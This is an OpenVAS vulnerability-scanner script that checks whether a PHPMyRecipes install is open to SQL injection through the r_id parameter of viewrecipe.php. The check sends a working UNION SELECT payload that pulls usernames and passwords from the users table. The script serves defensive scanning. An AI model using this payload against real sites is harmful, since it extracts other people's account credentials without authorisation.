###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_phpmyrecipes_sql_inj_vuln.nasl 28055 2013-02-22 18:45:39Z feb$
#
# PHPMyRecipes SQL Injection Vulnerability
#
# Authors:
# Arun Kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (c) 2013 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation allow the attacker to compromise the application,
  access or modify data in the back-end database.
  Impact Level: Application";

tag_affected = "PHPMyRecipes version 1.2.2 and prior";
tag_insight = "Input passed via 'r_id' parameter in viewrecipe.php is not properly sanitised
  before being returned to the user.";
tag_solution = "No solution or patch is available as of  22nd February 2013,Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://php-myrecipes.sourceforge.net";
tag_summary = "This host is installed with PHPMyRecipes and is prone to SQL
  Injection Vulnerability.";

if(description)
{
  script_id(903204);
  script_version("$Revision: 11 $");
  script_bugtraq_id(58094);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-02-22 18:45:39 +0530 (Fri, 22 Feb 2013)");
  script_name("PHPMyRecipes SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/82243");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/24537");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/120425/phpMyRecipes-1.2.2-SQL-Injection.html");

  script_description(desc);
  script_summary("Check if phpMyRecipes vulnerable to SQL Injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
req = "";
res = "";
url = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list("", "/phpMyRecipes", "/recipes", cgi_dirs()))
{
  ## Send and Receive the response
  req = http_get(item:string(dir,"/index.php"),  port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  ## Confirm the application
  if('>phpMyRecipes' >< res)
  {
    ## Construct the Attack Request
    url = string(dir, "/recipes/viewrecipe.php?r_id=NULL/**/UNION/**/ALL/**",
                "/SELECT/**/CONCAT(username,0x3a,password,0x4f70656e5641532d",
                "53514c2d496e6a656374696f6e2d54657374)GORONTALO,NULL,NULL,",
                "NULL,NULL,NULL,NULL,NULL,NULL/**/FROM/**/users");

    ## Try attack and Confirm the vulnerability
    if(http_vuln_check(port:port, url:url, pattern:"OpenVAS-SQL-Injection",
      "-Test", check_header:TRUE, extra_check:"findrecipe.php"))
    {
      security_hole(port:port);
      exit(0);
    }
  }
}
